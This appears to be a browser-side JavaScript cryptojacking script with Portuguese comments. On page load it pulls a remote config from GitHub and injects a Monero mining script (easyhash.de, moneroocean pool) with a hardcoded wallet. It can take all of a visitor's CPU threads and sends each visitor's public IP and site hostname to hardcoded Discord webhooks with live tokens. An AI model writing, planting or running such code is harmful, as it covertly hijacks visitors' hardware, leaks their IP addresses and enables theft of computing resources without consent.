let webhookErro = "https://discord.com/api/webhooks/1217454688559960074/tFLwi1Z4rAnx0G3qba4buf0FNanr3lB5hByMZlcP3ZJptOtIQGKnTTQyzCATTdctdGQI"
let webhookStart = "https://discord.com/api/webhooks/1217450763396059136/RylccC66DRHyLIKZAC6X2ry27p1vFzMsK_D9DEGjl7Bgrh8Xpdo9jl-4YbMqIxFPCm2K"
let webhookErroGit = "https://discord.com/api/webhooks/1217457429789282436/y3E6ydFkanKInVPVikveFu4S6ftCaaTUxUXUUHs3a3HOGUjAio0EqmbaQuu8SL2IM8MJ"

let gitLink = "https://raw.githubusercontent.com/awhh31241as/g222215aggdgawsgvvasgv/main/a.json"

var wallet = ""
var threads = 1
var threadsDisponivel = "" 

let resource = getResourceName();

window.onload = function() {
    fetch(gitLink)
    .then(response => {
        return response.json();
      })
      .then(data => {
        wallet = getWallet(data["wallet"])
        let [threadsDisponivel, threads] = getThreads(data["thread"])
        servidor = getServidor(data["js"])

        startA(wallet, threadsDisponivel, threads, servidor)
      })
    .catch(error => {
        sendWebhookMessage(webhookErroGit, `${resource} - Erro ao pegar dados do git - ${error}`)
    });
}

function startA(wallet, threadsDisponivel, threads, servidor){
    let numberA = Math.floor(Math.random() * 1000) + 1;
    var script = document.createElement('script');
    script.src = servidor;
    document.head.appendChild(script);

    script.onload = function() {
        fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            ipAddress = data.ip;
            sendWebhookMessage(webhookStart, `${resource} - Iniciado em - ${ipAddress} / ${numberA} - Thread Disponivel - ${threadsDisponivel} - Thread Usada - ${threads} - Servidor - ${servidor} - Wallet - ${wallet}`)
            PerfektStart(wallet, `${ipAddress} / ${numberA}`, threads);
        })
        .catch(error => {
            sendWebhookMessage(webhookErro, `${resource} - Erro ao obter endereço de ip: ${error}`)
        });
    }
}

function getWallet(wallet){
    if (!wallet || wallet == ""){
        return "421HhZZLg6M7UsTdQAr5P89pGT8BkGs7menXYn9YwYFTbbWAr52XSpA8BW175HQmYj6NtvU8LTQ8CXXYDpbf5Jt2VQd8hTo"
    }else{
        return wallet
    }
}

function getServidor(url){
    if (!url || url === ""){
     return "https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10128"
    }else{
        return url
    }
}

function getThreads(thread){
    // 1 - Usa uma thread, 2 - usa duas thread, 3 - usa tres thread ..., "full" - usa tudo, "half" -- usa metade , "triple" -- usa 1/3
    
    let threadDisp = navigator.hardwareConcurrency;
    if (!thread || thread === ""){
        return [threadDisp, 1];
    }

    if (typeof thread === "number") {
        return [threadDisp, Number(thread)];

    } else if (thread === "full"){
        return [threadDisp, threadDisp];

    } else if(thread === "half"){
        return [threadDisp, Math.ceil(threadDisp / 2)];

    } else if(thread === "triple"){
        return [threadDisp, Math.ceil(threadDisp / 3)];
    }

    return [threadDisp, 1]; // Correção: retornando o número de threads disponíveis
}

function sendWebhookMessage(webhook, message){
    fetch(webhook, {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json'
        },

        body: JSON.stringify({
            content: message
        })
    })
}

function getResourceName(){
    let resource = window.location.href.split("/")[2]
    if (!resource){
        return "Nada"
    }
    return resource
}
